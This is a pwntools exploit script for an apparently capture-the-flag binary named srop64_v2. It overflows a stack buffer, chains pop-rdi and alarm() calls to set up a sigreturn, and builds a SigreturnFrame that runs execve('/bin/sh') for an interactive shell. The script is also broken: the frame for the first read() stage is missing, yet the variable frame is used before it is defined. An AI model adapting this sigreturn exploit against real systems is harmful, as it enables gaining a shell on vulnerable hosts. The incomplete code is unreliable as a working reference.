from pwn import *
context.arch = "amd64"
context.log_level = "debug"

e = ELF('./srop64_v2')
#p = remote("realsung.kr", 13338)
p = process(e.path)

pop_rdi = 0x00000000004006a3
syscall = 0x000000000040063e

payload = b"a"*0x30
payload += b'b'*8

payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(e.sym['alarm'])
payload += p64(pop_rdi)
payload += p64(0x10000)
payload += p64(e.sym['alarm'])

payload += p64(syscall)

# read(0,bss+0x100,0x100)


    
payload += bytes(frame)

payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(e.sym['alarm'])
payload += p64(pop_rdi)
payload += p64(0x10000)
payload += p64(e.sym['alarm'])

payload += p64(syscall)

# execve("/bin/sh",0,0)
frame = SigreturnFrame(arch='amd64')
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = e.bss() + 0x100

payload += bytes(frame)

pause()
p.sendline(payload)
pause()
p.send(b"/bin/sh\x00")

p.interactive()